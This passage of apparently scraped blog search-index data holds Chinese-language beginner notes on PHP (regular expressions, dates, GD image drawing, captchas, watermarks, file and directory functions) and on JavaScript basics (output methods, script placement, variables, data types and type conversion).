在和模式进行匹配时不区分大小写m 多行匹配，如果目标字符串中没有&quot;\\n&quot;字符，或者正则表达式中没有出现^或$，设置这个修饰符不产 生任何影响s 如果设定了此修正符，那么将匹配所有的字符包括换行符U 禁止贪婪匹配模式修正符他是可以搭配使用的，可以使用多个$pattern&#x3D;&#39;&#x2F;test&#x2F;i&#39;;$str &#x3D; &#39; test TEST Test TeSt &#39;;var_dump(preg_match_all($pattern,$str,$arr));var_dump($arr); 与正则表达式配合的函数12345678910111213141516171819202122232425262728293031323334353637383940414243444546最常用的匹配函数 1、preg_match() &#x2F;&#x2F;执行一个正则表达式匹配，返回值0次或者1次 参数说明： 第一个参数：正则表达式 第二个参数：目标字符串 第三个参数：放一个变量，执行完成之后，里面会有匹配到的部分以及等等一些数据。 第四个参数：可以传PREG_OFFSET_CAPTURE进入(那么第三个参数那个变量里面的数据就会有匹配到的部分的偏移值)，默认是0 第五个参数：可以传一个值，来表示从目标字符串的哪个位置开始匹配（单位是字节）。 $pattern &#x3D; &#39;&#x2F;t(.*?)st&#x2F;&#39;; $str &#x3D; &#39; test tadasst &#39;; if(preg_match($pattern,$str))&#123; echo &#39;找到了&#39;; &#125;else&#123; echo &#39;没找到&#39;; &#125; &#x2F;&#x2F;var_dump($arr); 2、preg_match_all() &#x2F;&#x2F; 按指定的正则表达式，在给定的字符串中进行搜索，匹配到复合特征的部分取出来 $pattern &#x3D; &#39;&#x2F;t(.*?)st&#x2F;&#39;; $str &#x3D; &#39; test tadasst &#39;; var_dump(preg_match_all($pattern,$str,$arr)); var_dump($arr); 结果: array (size&#x3D;2) 0 &#x3D;&gt; array (size&#x3D;2) 0 &#x3D;&gt; string &#39;test&#39; (length&#x3D;4) 1 &#x3D;&gt; string &#39;tadasst&#39; (length&#x3D;7) 1 &#x3D;&gt; array (size&#x3D;2) 0 &#x3D;&gt; string &#39;e&#39; (length&#x3D;1) 1 &#x3D;&gt; string &#39;adas&#39; (length&#x3D;4) 3、preg_replace() &#x2F;&#x2F;执行一个正则表达式的搜索和替换 参数说明: 第一个参数:正则表达式 第二个参数:要替换成的字符串 第三个参数:目标字符串 第四个参数:默认是-1，就是替换所有符合特征部分的 $pattern &#x3D; &#39;&#x2F;(.*?)&#x2F;&#39;; $str &#x3D; &#39;\\\\1&#39;; $str1 &#x3D; &#39;saiudhdstest&#39;; var_dump(preg_replace($pattern,$str,$str1)); var_dump($str1); 日期与时间123456789101112131415161718192021222324252627282930313233343536373839一、设置时区 默认的时区是UTC date_default_timezone_set(&#39;Asia&#x2F;Shanghai&#39;);二、获取当前Unix时间戳 Unix时间戳 从Unix纪元(格林威治时间1970年1月1日00时00分00秒)开始到当前的秒数 time();三、获取指定时间的Unix时间戳 mktime(); &#x2F;&#x2F;顺序是，时,分,秒,月,日,年 var_dump(mktime(0,0,0,10,1,2015)); 还可以 $nowtime&#x3D;time();&#x2F;&#x2F;获取Unix时间戳 &#x2F;&#x2F;顺序是，时,分,秒,月,日,年 $mktime1&#x3D;mktime(0,0,0,10,1,2020); echo &#39;距离2020年国庆还有&#39;.(($mktime1-$nowtime)&#x2F;60&#x2F;60&#x2F;24).&#39;天&#39;; 四、从Unix时间戳取得时间日期信息&#x2F;&#x2F;格式化一个本地时间&#x2F;日期 date(); 第一个参数：必填，自己定义时间日期格式 var_dump(date(&#39;Y-m-d G:i:s&#39;));五、获取Unix时间戳和微秒数&#x2F;&#x2F;返回当前Unix时间戳和微秒数 microtime(); var_dump(microtime()); var_dump(microtime(true)); 可以用于查看程序运行时间 例如for循环 &#x2F;&#x2F;round();函数是显示小数点后几位 $start&#x3D;microtime(true); for ($i&#x3D;0;$i&lt;100000;$i++)&#123; &#125; $end&#x3D;microtime(true); echo &#39;循环用了&#39;.round(($end-$start),3).&#39;秒&#39;; 图像处理12345678创建一个图像应该完成如下所示的四个基本步骤1、创建图像 所有的绘图设计都需要在一个图像上完成，以后的操作都将基于这个图像2、绘制图像 图像创建完成以后，就可以通过这个图像资源，使用各种画像函数设置图像的颜色、填充画布、画 点、线段、各种几何图形，以及向图像的添加文本等3、输出图像 完成整个图像的绘制之后，需要将图像以某个格式保存到服务器的文件中，或者将图像直接输出到浏 览器上显示给用户。但在图像输出之前一定要是用header()函数发送Content-type通知浏览器， 这次发送的是图片不是文本4、释放资源 123456789101112131415161718192021222324252627282930313233343536373839一、创建图像imagecreatetruecolor(); 创建一个真彩色图像 实例: $img &#x3D; imagecreatetruecolor(200,200);二、绘制图像 $color1&#x3D;imagecolorallocate($img,50,120,200);&#x2F;&#x2F;分配颜色 $color2&#x3D;imagecolorallocate($img,46,219,50);三、输出图像 header函数注意点 在header函数之前不能输出任何内容，包括空格，空字符串等四、释放资源imagedestroy() &#x2F;&#x2F;销毁图片实例整体:&#x2F;&#x2F;不使用header浏览器不知道你要输出的什么会乱码，&#x2F;&#x2F;NetWork里面显示,Content-Type:test&#x2F;html&#x2F;&#x2F;使用header更改格式，底下用的imagejpeg所以更改为image传输为jpeg header(&#39;Content-Type:image&#x2F;jpeg&#39;); $img &#x3D; imagecreatetruecolor(200,200);&#x2F;&#x2F;创建一个长和高都为200像素的真彩色图像 $color1&#x3D;imagecolorallocate($img,50,120,200);&#x2F;&#x2F;分配颜色 $color2&#x3D;imagecolorallocate($img,46,219,50); imagefill($img,0,0,$color2); imagejpeg($img);另存为图片&#x2F;&#x2F;将之前的image&#x2F;jpeg改为原本的text&#x2F;html header(&#39;Content-Type:text&#x2F;html charset&#x3D;UFT-8&#39;); $img &#x3D; imagecreatetruecolor(200,200);&#x2F;&#x2F;创建一个长和高都为200像素的真彩色图像 $color1&#x3D;imagecolorallocate($img,50,120,200);&#x2F;&#x2F;分配颜色 $color2&#x3D;imagecolorallocate($img,46,219,50); imagefill($img,0,0,$color2);&#x2F;&#x2F;在这里加一个相对路径就是要保存的位置 if(imagejpeg($img,&#39;images&#x2F;sunwukong.jpeg&#39;))&#123; &#x2F;&#x2F;保存图片 echo &#39;保存成功&#39;; &#125; imagedestroy($img); 1绘制图像 验证码12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849&lt;?php$witch&#x3D;120;$height&#x3D;60;&#x2F;&#x2F; 更改格式，否则报错header(&#39;Content-Type:image&#x2F;jpeg&#39;);&#x2F;&#x2F; 设置随机数，使用.将其连接$string&#x3D;&#39;&#39;;for($i&#x3D;0;$i&lt;4;$i++)&#123; $element&#x3D;array(&#39;a&#39;,&#39;b&#39;,&#39;c&#39;,&#39;d&#39;,&#39;e&#39;,&#39;f&#39;,&#39;g&#39;,&#39;h&#39;,&#39;i&#39;,&#39;j&#39;,&#39;k&#39;,&#39;l&#39;,&#39;m&#39;,&#39;n&#39;,&#39;o&#39;,&#39;p&#39;,&#39;q&#39;,&#39;r&#39;,&#39;s&#39;,&#39;t&#39;,&#39;u&#39;,&#39;v&#39;,&#39;w&#39;,&#39;x&#39;,&#39;y&#39;,&#39;z&#39;); $string.&#x3D;$element[rand(0,count($element)-1)];&#125;&#x2F;&#x2F; 创建一个真彩图像$img &#x3D; imagecreatetruecolor($witch,$height);&#x2F;&#x2F; 填充颜色$col1&#x3D;imagecolorallocate($img,rand(20,255),rand(20,255),rand(20,255));$col2&#x3D;imagecolorallocate($img,rand(200,255),rand(200,255),rand(200,255));$col3&#x3D;imagecolorallocate($img,rand(20,255),rand(20,255),rand(20,255));&#x2F;&#x2F; 填充区域$fill &#x3D; imagefill($img,0,0,$col1);imagerectangle($img,0,0,$witch-1,$height-1,$col2);&#x2F;&#x2F; 创建单一像素进行循环for($i&#x3D;0;$i&lt;&#x3D;100;$i++)&#123; imagesetpixel($img,rand(0,$witch-1),rand(0,$height-1), imagecolorallocate($img,rand(20,255),rand(20,255),rand(20,255)));&#125;&#x2F;&#x2F; 创建线段，进行循环for($i&#x3D;0;$i&lt;&#x3D;3;$i++)&#123; imageline($img,rand(0,$witch&#x2F;2),rand(0,$height), rand($witch&#x2F;2,$witch),rand(0,$height), imagecolorallocate($img,rand(20,255),rand(20,255),rand(20,255)));&#125;&#x2F;&#x2F; 向图像中创建字符串&#x2F;&#x2F; imagestring($img,5,0,0,&#39;abcd&#39;,$col3);imagettftext($img,25,rand(2,25),rand(30,50),rand(30,$height),$col3,&#39;font&#x2F;ITCBLKAD.TTF&#39;,$string);imagejpeg($img); 1234水印1、创建新的 imagecreatetruecolor() 2、打开服务器或网络文件中已经存在的GIF,JPEG,PNG,WBMP格式图像 1234567891011121314文字水印header(&#39;Content-type:image&#x2F;jpg&#39;);$img &#x3D; imagecreatefromjpeg(&#39;picture&#x2F;Pu.jpg&#39;);$color&#x3D;imagecolorallocate($img,120,55,42);$width&#x3D;imagesx($img);$height&#x3D;imagesy($img);$position&#x3D;imagettfbbox(20,0,&#39;picture&#x2F;chinese1.TTF&#39;,&#39;笛声&#x2F;悠扬&#39;);$length&#x3D;$position[2]-$position[0];imagettftext($img,20,0,$width-1-$length-($width&#x2F;5),$height-1-($height&#x2F;30),$color,&#39;picture&#x2F;chinese1.TTF&#39;,&#39;笛声&#x2F;悠扬&#39;);imagejpeg($img);imagedestroy($img); 1234567891011121314151617181920212223242526272829303132图片和文字水印header(&#39;Content-type:image&#x2F;jpg&#39;);$img &#x3D; imagecreatefromjpeg(&#39;picture&#x2F;Pu.jpg&#39;);$mark&#x3D;imagecreatefromgif(&#39;picture&#x2F;minalt.gif&#39;);$color&#x3D;imagecolorallocate($img,120,55,42);$width&#x3D;imagesx($img);$height&#x3D;imagesy($img);$markWidth&#x3D;imagesx($mark);$markHeight&#x3D;imagesy($mark);$position&#x3D;imagettfbbox(20,0,&#39;picture&#x2F;chinese1.TTF&#39;,&#39;笛声&#x2F;悠扬&#39;);$length&#x3D;$position[2]-$position[0];&#x2F;&#x2F; 文字水印imagettftext($img,20,0,$width-1-$length-($width&#x2F;30),$height-1-($height&#x2F;30),$color,&#39;picture&#x2F;chinese1.TTF&#39;,&#39;笛声&#x2F;悠扬&#39;);&#x2F;*参数说明： $img：目标图像资源 $wateMake：水印的图像资源 100：所要拷贝到目标图像资源上面的坐标(x轴的位置) 100：所要拷贝到目标图像资源上面的坐标(y轴的位置) 0：从水印图像资源的x坐标为0的位置开始拷贝 0：从水印图像资源的y坐标为0的位置开始拷贝 $wateWidth：所要拷贝水印图像的长度 $wateHeight：所要拷贝水印图像的宽度*&#x2F;imagecopy($img,$mark,100,100,0,0,$markWidth,$markHeight);imagejpeg($img);imagedestroy($img); 1234567891011121314151617181920212223242526272829303132333435363738更改图片透明度header(&#39;Content-type:image&#x2F;jpg&#39;);$img &#x3D; imagecreatefromjpeg(&#39;picture&#x2F;xihu.jpg&#39;);$mark&#x3D;imagecreatefrompng(&#39;picture&#x2F;xiao.png&#39;);$color&#x3D;imagecolorallocate($img,120,55,42);$width&#x3D;imagesx($img);$height&#x3D;imagesy($img);$markWidth&#x3D;imagesx($mark);$markHeight&#x3D;imagesy($mark);$position&#x3D;imagettfbbox(20,0,&#39;picture&#x2F;chinese1.TTF&#39;,&#39;笛声&#x2F;悠扬&#39;);$length&#x3D;$position[2]-$position[0];&#x2F;&#x2F; 文字水印imagettftext($img,20,0,$width-1-$length-($width&#x2F;30),$height-1-($height&#x2F;30),$color,&#39;picture&#x2F;chinese1.TTF&#39;,&#39;笛声&#x2F;悠扬&#39;);&#x2F;*参数说明： $img：目标图像资源 $wateMake：水印的图像资源 100：所要拷贝到目标图像资源上面的坐标(x轴的位置) 100：所要拷贝到目标图像资源上面的坐标(y轴的位置) 0：从水印图像资源的x坐标为0的位置开始拷贝 0：从水印图像资源的y坐标为0的位置开始拷贝 $wateWidth：所要拷贝水印图像的长度 $wateHeight：所要拷贝水印图像的宽度 0：代表透明度，数字越小越透明，100的时候相当于 imagecopy*&#x2F;&#x2F;&#x2F;imagecopy($img,$mark,800,500,0,0,$markWidth,$markHeight);&#x2F;&#x2F; 可以更改透明度imagecopymerge($img,$mark,800,500,0,0,$markWidth,$markHeight,0);imagejpeg($img);imagedestroy($img); 缩放与裁剪1234567891011121314151617181920212223242526272829303132333435363738&#x2F;* 等比例缩放*&#x2F;header(&#39;Content-type:image&#x2F;jpeg&#39;);$width&#x3D;500;$img&#x3D;imagecreatefromjpeg(&#39;picture&#x2F;xihu.jpg&#39;);$imgWidth&#x3D;imagesx($img);$imgHeight&#x3D;imagesy($img);$height&#x3D;$width&#x2F;($imgWidth&#x2F;$imgHeight);$target&#x3D;imagecreatetruecolor($width,$height);&#x2F;*imagecopyresampled(1,2,3,4,5,6,7,8,9,10)函数中的参数 1、目标图像资源 2、原图像资源(需要采样的那个图像资源) 3、目标图像资源坐标位置(x)轴 4、目标图像资源坐标位置(y)轴(与3一样确定了一个坐标,把采样到的部分，放到目标图像资源的什么位置) 5、原图像资源坐标位置(x)轴 6、原图像资源坐标位置(y)轴(你要残阳的原图像资源的某个部分的起始坐标() 7、目标长度 8、目标高度(确定了放到目标图像资源上面的尺寸) 9、原图像长度 10、原图像高度(确定了采样原图像资源的某个部分)*&#x2F;imagecopyresampled($target,$img,0,0,0,0,$width,$height,$imgWidth,$imgHeight);&#x2F;&#x2F; 裁剪&#x2F;&#x2F; imagecopyresampled($target,$img,0,0,0,0,100,100,100,100);if(imagejpeg($target))&#123; imagejpeg($target,&#39;picture&#x2F;xxhh.jpg&#39;);&#125;imagedestroy($img);imagedestroy($target); 文件与目录操作目录的基本操作1任何数据类型变量所有存储的数据，都是在程序运行时才加载到内存中的，而不能持久保存，那么如果需要将数据长久的保存起来，有两种方法，保存到普通文件中或者保存到数据中，我们的PHP可以在我们的服务器上生成目录、创建、编辑、删除、修改文件属性等操作 一、判断普通文件和目录1234561、is_file() &#x2F;&#x2F; 判断给定的文件名是否为一个正常的文件 实例： var_dump(is_file(&#39;index.php&#39;));2、is_dir() &#x2F;&#x2F; 判断给定文件名是否是一个目录 实例： var_dump(is_dir(&#39;..&#x2F;demo5&#x2F;&#39;)); 二、文件的属性 12345678910111213141516171819202122232425262728293031323334353637383940414243file_exists() &#x2F;&#x2F; 检查文件或目录是否存在 实例: &#x2F;&#x2F; 检查文件 $sum &#x3D; &#39;index.php&#39;; if(file_exists($sum))&#123; echo &#39;true&#39;.&#39;&lt;br &#x2F;&gt;&#39;; &#125;else&#123; echo &#39;false&#39;.&#39;&lt;br &#x2F;&gt;&#39;; &#125; &#x2F;&#x2F; 检查目录 $sum &#x3D; &#39;..&#x2F;demo5&#x2F;&#39;; if(file_exists($sum))&#123; echo &#39;true&#39;; &#125;else&#123; echo &#39;false&#39;; &#125;filesize() &#x2F;&#x2F; 取得普通文件的大小 实例： $filename&#x3D;&#39;index.php&#39;; &#x2F;&#x2F; 想要将字节转换成MB需要&#x2F;1024&#x2F;1024 除两次1024 echo $filename.&#39;:&#39;.filesize($filename).&#39;bytes&#39;; &#x2F;&#x2F; 如果可写，可读返回true is_readable() &#x2F;&#x2F; 判断文件是否可读 实例: var_dump(is_readable(&#39;index.php&#39;)); is_writable() &#x2F;&#x2F; 判断文件是否可写 实例: var_dump(is_writeable(&#39;index.php&#39;)); filectime(); &#x2F;&#x2F; 获取文件创建时间 实例: date_default_timezone_set(&#39;Asia&#x2F;Shanghai&#39;); echo date(&#39;Y-m-d G:i:s&#39;,filectime(&#39;index.php&#39;)); filemtime() &#x2F;&#x2F; 获取文件修改时间 实例： date_default_timezone_set(&#39;Asia&#x2F;Shanghai&#39;); echo date(&#39;Y-m-d G:i:s&#39;,filemtime(&#39;index.php&#39;)); 三、目录的基本操作 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364651、basename(); &#x2F;&#x2F; 返回路径中的文件名部分 实例： date_default_timezone_set(&#39;Asia&#x2F;Shanghai&#39;); &#x2F;&#x2F; 返回当前文件绝对路径 echo __FILE__.&#39;&lt;br &#x2F;&gt;&#39;; &#x2F;&#x2F; 使用basename只返回文件名 echo basename(__FILE__); 2、dirname(); &#x2F;&#x2F; 返回路径中的目录部分 实例: date_default_timezone_set(&#39;Asia&#x2F;Shanghai&#39;); echo __FILE__.&#39;&lt;br &#x2F;&gt;&#39;; &#x2F;&#x2F; 使用dirname返回路径中的目录部分，只显示到目录 echo dirname(__FILE__).&#39;&lt;br &#x2F;&gt;&#39;; 3、pathinfo(); &#x2F;&#x2F; 返回路径中的信息 实例： date_default_timezone_set(&#39;Asia&#x2F;Shanghai&#39;); echo __FILE__.&#39;&lt;br &#x2F;&gt;&#39;; &#x2F;&#x2F; 以数组的形式输出 var_dump(pathinfo(__FILE__)).&#39;&lt;br &#x2F;&gt;&#39;; 4、opendir(); &#x2F;&#x2F; 打开目录句柄，也可以叫目录资源5、deaddir(); &#x2F;&#x2F; 读取目录句柄的条目，返回目录中下一个文件的文件名 实例： date_default_timezone_set(&#39;Asia&#x2F;Shanghai&#39;); $dir &#x3D; opendir(&#39;..&#x2F;demo5&#39;); for($i&#x3D;0;$i&lt;&#x3D;3;$i++)&#123; var_dump(readdir($dir)); &#125; 6、rewinddir();(了解) &#x2F;&#x2F; 倒回目录句柄 实例： date_default_timezone_set(&#39;Asia&#x2F;Shanghai&#39;); $dir &#x3D; opendir(&#39;..&#x2F;demo5&#39;); for($i&#x3D;0;$i&lt;&#x3D;2;$i++)&#123; var_dump(readdir($dir)); &#125; rewinddir($dir); var_dump(readdir($dir));7、closedir(); &#x2F;&#x2F; 关闭目录句柄 实例： &#x2F;&#x2F; 返回false closedir($dir); var_dump(readdir($dir)); 8、mkdir(); &#x2F;&#x2F; 新建目录 实例： &#x2F;&#x2F; 创建文件夹 var_dump(mkdir(&#39;file&#39;)); &#x2F;&#x2F; 设置文件夹最高权限，0777代表linux中r-w-x，4-2-1 var_dump(mkdir(&#39;file&#39;,0777)); &#x2F;&#x2F; 加上true可以创建多层目录 var_dump(mkdir(&#39;file1&#x2F;liux&#x2F;r-w-x&#39;,0777,true));9、rmdir(); &#x2F;&#x2F; 删除指定的空目录 实例： var_dump(rmdir(&#39;demo5&#x2F;file1&#39;)); 10、scandir(); &#x2F;&#x2F; 列出指定路径中的文件和目录 实例： var_dump(scandir(&#39;..&#x2F;demo5&#39;)); 四、文件的基本操作 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364651、fopen(); &#x2F;&#x2F; 打开文件或者URL2、fread(); &#x2F;&#x2F; 读取文件 实例： header(&#39;Content-type:text&#x2F;html;charset&#x3D;utf-8&#39;); $file&#x3D;fopen(&#39;test.txt&#39;,&#39;r&#39;); var_dump(fread($file,3)); 3、fgets(); &#x2F;&#x2F; 从文件指针中读取一行 实例： header(&#39;Content-type:text&#x2F;html;charset&#x3D;utf-8&#39;); $file&#x3D;fopen(&#39;test.txt&#39;,&#39;r&#39;); var_dump(fgets($file,3));4、feof(); &#x2F;&#x2F; 测试文件指针是否到了文件结束位置 实例 $file&#x3D;fopen(&#39;test.txt&#39;,&#39;r&#39;); for($i&#x3D;0;$i&lt;&#x3D;10;$i++)&#123; var_dump(fgets($file)); &#125; var_dump(feof($file)); 5、fwrite(); &#x2F;&#x2F; 写入文件 实例: $file&#x3D;fopen(&#39;test.txt&#39;,&#39;r+&#39;); var_dump(fwrite($file,&#39;龙傲九天&#39;)); 6、rewind(); &#x2F;&#x2F; 倒回文件目录指针位置7、flock(); &#x2F;&#x2F; 轻便的咨询文件锁定 实例： $file&#x3D;fopen(&#39;test.txt&#39;,&#39;a+&#39;); &#x2F;&#x2F; 共享锁：LOCK_SH，独占锁：LOCK_EX，释放锁定：LOCK_UN， &#x2F;&#x2F; 不希望flock()在锁定时堵塞：LOCK_NB, if(flock($file,LOCK_EX))&#123; &#x2F;&#x2F; sleep 延时 sleep(15); fwrite($file,&#39;2.php&#39;); flock($file,LOCK_UN); &#125;else&#123; echo &#39;加锁失败&#39;; 8、ftruncate(); &#x2F;&#x2F; 将文件截断到给定的长度9、fclose(); &#x2F;&#x2F; 关闭一个已经打开的文件指针 实例 fclose($file);10、file(); &#x2F;&#x2F; 把整个文件读入一个数组中11、copy(); &#x2F;&#x2F; 拷贝文件12、unlink(); &#x2F;&#x2F; 删除文件13、file_get_contents(); &#x2F;&#x2F; 将整个文件读入一个字符串14、file_put_contents(); &#x2F;&#x2F; 将字符串写入文件中 实例： header(&#39;Content-type;text&#x2F;html;charset&#x3D;utf-8&#39;); &#x2F;&#x2F; 可以填入URL var_dump(file_get_contents(&#39;test.txt&#39;)); &#x2F;&#x2F; 写入文件中并覆盖原来的内容 var_dump(file_put_contents(&#39;test.txt&#39;,&#39;www.baidu.com&#39;));15、rename(); &#x2F;&#x2F; 重命名一个文件或目录16、readfile(); &#x2F;&#x2F; 读入一个文件并写入到输出缓冲","categories":[],"tags":[]},{"title":"JavaScript","slug":"JavaScript","date":"2020-04-03T06:33:47.810Z","updated":"2020-04-03T06:33:44.000Z","comments":true,"path":"2020/04/03/JavaScript/","link":"","permalink":"https://zhanqiaozai.github.io/2020/04/03/JavaScript/","excerpt":"","text":"JavaScript语言特点1、基于对象的编程语言2、解释执行脚本语言第一个JS代码hello wordalert()属性alert()控制浏览器弹出一个警告框 1alert(&quot;这是我的第一行JS代码&quot;) document.write()属性document.write()让计算机在页面输出一个内容 1document.write(&quot;点我一下看我出不出来&quot;) console.log()属性console.log()向控制台输出一个内容console.log 只能在网页源代码中的控制台显示 12# console.log 只能在网页源代码中的控制台显示console.log(&quot;你猜我在哪里&quot;) 以上这些条件都需要写在script标签中JS编写位置虽然可以写在标签的属性中，但是他们属于结构与行为耦合，不方便维护，不推荐使用12345678可以将JS代码编写到标签的onclick属性中当我们点击按钮时，JS代码才会执行&lt;button onclick&#x3D;&quot;alert(&#39;你为什么要点我&#39;);&quot;&gt;点我一下&lt;&#x2F;button&gt;可以将JS代码写在超链接的href属性中，这样当我们点击超链接时，或执行JS代码&lt;a href&#x3D;&quot;javascript:alert(&#39;你怎么又点了我一下&#39;);&quot;&gt;你也点我一下&lt;&#x2F;a&gt;&lt;a href&#x3D;&quot;javascript:&quot;&gt;你也点我一下&lt;&#x2F;a&gt; 1234可以将js代码编写到script标签中&lt;script type&#x3D;&quot;text&#x2F;javascript&quot;&gt; alert(&quot;这是script标签中的代码&quot;); &lt;&#x2F;script&gt; 123456789101112可以将js代码编写到外部js文件中，然后通过script标签引入写到外部文件中，可以再不同的页面同时引用，也可以利用到浏览器的缓存机制推荐使用的方式引入的命令式 src&#x3D;&quot;外部文件名称&quot;&lt;script type&#x3D;&quot;text&#x2F;javascript&quot; src&#x3D;&quot;script.js&quot;&gt;&lt;&#x2F;script&gt;script标签一旦用于引入外部文件，就不能编写代码了，即使编写了浏览器也会忽略 如果需要则可以再创建一个script标签用于编写内部代码&lt;script type&#x3D;&quot;text&#x2F;javascript&quot;&gt; alert(&quot;我是内部代码，刚才不行，我新建一个script标签&quot;);&lt;&#x2F;script&gt; JS基本语法123456789101112131415&#x2F;* *&#x2F;多行注释 JS注释 多行注释，注释中的内容不会被执行，但是可以再源代码中查看 要养成良好的编写注释的习惯，也可以通过注释来对代码进行一些简单的测试 &#x2F;&#x2F;单行注释 alert(&quot;hello&quot;); &#x2F;&#x2F;该语句会在网页中弹出一个窗口 document.write(&quot;hello&quot;);&#x2F;&#x2F;该语句用来在网页中输出 console.log(&quot;hello&quot;);&#x2F;&#x2F;该语句用来在控制台输出 1、在JS中严格区分大小写2、JS中每一条语句以分号(;)结尾 - 如果不写分号，浏览器会自动添加，但是会消耗一些系统资源 而且有些时候，浏览器会加错分号，所以在开发中分号必须写3、JS中会忽略多个空格和换行，所以我们可以利用这个空格和换行进行格式化 字面量和变量1234567891011121314151617181920字面量，都是一些不可改变的值比如：1、2、3、4、5、字面量都是可以直接使用的，但是我们一般都不会直接使用字面量 变量 变量可以用来保存字面量，而且变量的值是可以任意改变的 变量更加方便使用，所以在开发中都是通过变量去保存一个字面量 而很少使用字面量 可以通过变量对字面量进行描述如果要是用需要声明变量在JS中声明变量用关键字var，假如要定义一个变量a var a;为变量赋值 a &#x3D; 123; a &#x3D; 456; a &#x3D; 1321561615315;可以声明和赋值同时进行 var a &#x3D; 123; var c &#x3D; 0; console.log(a); 标识符12345678910111213141516标识符 - 在JS中所有的可以由我们自主命名的都可以成为是标识符 - 例如：变量名、函数名、属性名都属于标识符 - 我们在命名一个标识符时需要遵守以下规则： 1、标识符中可以含有字母、数字、下划线、$符 2、标识符不能以数字开头 3、标识符不能是ES中的关键字或保留字 4、标识符一般都采用驼峰命名法 &#x2F;&#x2F;只是语法规范 - 首字母小写，每个单词首字母大写，其他字母小写 驼峰命名法:helloWord - JS底层保存的标识符实际上时采用Unicode编码(UTF-8)， 所以理论上讲，所有的UTF-8中含有的内容都可以作为标识符 var a_1_$ &#x3D; 12345; &#x2F;&#x2F;包含了字母、数字、下划线、$符 console.log(a_1_$); 数据类型字符串1234567891011121314151617181920212223242526272829数据类型指的就是字面量的类型、 在JS中一共有六中数据类型 String 字符串 Number 数值 Boolean 布尔值 Null 空值 Underfind 未定义 Object 定义对象 其中String Number Boolean Null Undefined属于基本数据类型 而Object属于引用数据类型 String字符串 - 字符串需要用引号引起来,双引号和单引号都可以。 如果想让引号或者其他特殊符号变成普通符号用 \\ 进行转义 \\ 表示转义字符 \\n 表示换行 \\t 制表符 \\\\ 自己转义自己 var str &#x3D; &quot;代码没写完不许睡觉&quot; &#x2F;&#x2F; 表示输出字面量，也就是输出当前字符串 alert(&quot;STR&quot;) &#x2F;&#x2F; 表示输出变量 alert(str); var str &#x3D; &quot;hello&quot;; console.log(str); Number123456789101112131415161718192021222324252627282930所有的数值都是Number类型， 包括整数和浮点数 JS中表示的数字最大值 Number.MAX_VALUE 1.7976931348623157e+308 Number.MIN_VALUE最小值 e-324 如果使用Number.MAX_VALUE超过了数字最大值，则会返回一个Infinity表示正无穷的 typeof检查Infinity返回 Number类型 字符串乘字符串会返回一个 NaN 而NaN表示这不是一个数字 typeof 检查 NaN 也是返回Number类型 &#x2F;&#x2F; 数字123 var a &#x3D; 123; &#x2F;&#x2F;字符串123 var b &#x3D; &quot;123&quot;; typeof 查看数据类型 &#x2F;&#x2F; console.log(typeof b); console.log(Number.MAX_VALUE); &#x2F;&#x2F; 在进行整数运算基本可以保证精确 var c &#x3D; 123156 + 151563; document.write(c); &#x2F;&#x2F; JS进行小数运算，可能得到一个不精确的结果 &#x2F;&#x2F; 千万不能使用JS进行对精确度比较高的运算 var c &#x3D; 0.1 + 0.2; document.write(c); Boolean12345布尔值只有两个，用来逻辑判断True和Fales使用typeof检查布尔值时，返回boolean var bool &#x3D; true; document.write(typeof bool); Null和Underfind1234567891011null类型的值只有一个就是null，表示空 使用typeof检查null值时，会返回object underfind类型的值只有一个，就是underfind 当声明一个变量并没有赋值时，他的值就是underfind 使用typeof检查underfind值时，会返回underfind var a &#x3D; null; var b; document.write(typeof b); 强制类型转换String12345678910111213141516171819202122232425262728293031强制类型转换 - 指将一个数据类型强制转换为其他数据类型 - 类型转换主要指，将其他数据类型转换为 String、Number、Boolean 将其他数据类型转换成String 方式一: - 调用被转换数据类型的toString()方法 - 该方法不会影响到原变量 - 注意null 和underfind这两个值没有tostring()方法, 如果通过他们的方法，会报错 方式二: - 调用String()函数,并将被转的数据类型作为参数传递给函数 - 使用String()函数做的强制类型转换时 对于Number和Boolean实际上就是调用的toString()方法 但是对于null和undefined，就不会调用toString()方法 他会将null直接转换成&quot;null&quot; 将undefined 直接转换为 &quot;underfined&quot;var a &#x3D; 123;&#x2F;&#x2F; 调用a的toString()方法&#x2F;&#x2F;调用 xxx的yyy()方法，就是xxx.yyyvar a &#x3D; a.toString();document.write(typeof a);document.write(a); var b &#x3D; 123;var c &#x3D; String(b);document.write(typeof c);document.write(c); Number123456789101112131415161718192021222324252627282930313233343536373839将其他的数据类型转换为Number转换方式一: 使用number()函数 - 字符换---&gt; 数字 1、如果是纯数字的字符串，则直接将其转换为数字 2、如果，字符串中又非数字的内容，则转换成NaN 3、如果字符串是一个空或者是全空格的字符串，则转换为0 - 布尔值 --&gt; 数字 true 变成 1 false 变成 0 - Null --&gt; 数字 0 - undefined --&gt; 数字 NaN转换方式二: - 这种方式专门用来对付字符串 - parseInt() 把一个字符串转换成一个整数 - parseFloat() 把一个字符串转换成一个浮点数 var a &#x3D; &quot;132&quot;;document.write(typeof a);document.write(a); var b &#x3D; &quot;123a456px&quot;;&#x2F;&#x2F; 调用parseInt()函数将b转换为number parseInt()可以将一个字符串中的有效的整数内容取出来 然后转换成NumberpasrFloat()作用和parseFloat()类似，不同的是它可以获得有效的小数c &#x3D; parseInt(b);a &#x3D; &quot;123.12。789px&quot;;a &#x3D;parseFloat(a);如果对非String使用parseInt()或parseFloat() 它会先将其转换为String，然后再操作a &#x3D; truea &#x3D; parseInt(a);document.write(typeof a);document.write(a); Boolean1234567891011121314151617将其他的数据类型转换为Boolean - 使用Boolean()函数 - 数字 ---&gt; 布尔 - 除了0和NaN，其余都为true - 字符串 ---&gt; 布尔 - 除了空串，都是true - null和undefined都会转换为False - 对象也会转换为true var a &#x3D; 123; &#x2F;&#x2F;truea &#x3D; -123; &#x2F;&#x2F;truea &#x3D; 0; &#x2F;&#x2F;falsea &#x3D; Infinity; &#x2F;&#x2F;true&#x2F;&#x2F; 调用Boolean()函数来将a转换为布尔值a &#x3D; Boolean(a);document.write(typeof a);document.write(a); 运算符12345678910111213141516171819202122232425262728293031323334353637383940414243运算符也叫操作符 通过运算符可以对一个或多个值进行运算 比如：typeof就是运算符，可以来获得一个值的类型 它会将该值的类型以字符串的形式返回 算术运算符 当对非Number类型的值进行运算时，会将这些值转换为Number然后再运算 任何值和NaN运算都是NaN 任何值和字符串做加法运算，都会先转换为字符串，然后再进行字符串拼接 + 可以对两个值进行加法运算并将结果返回 如果两个字符串相加，会拼接- 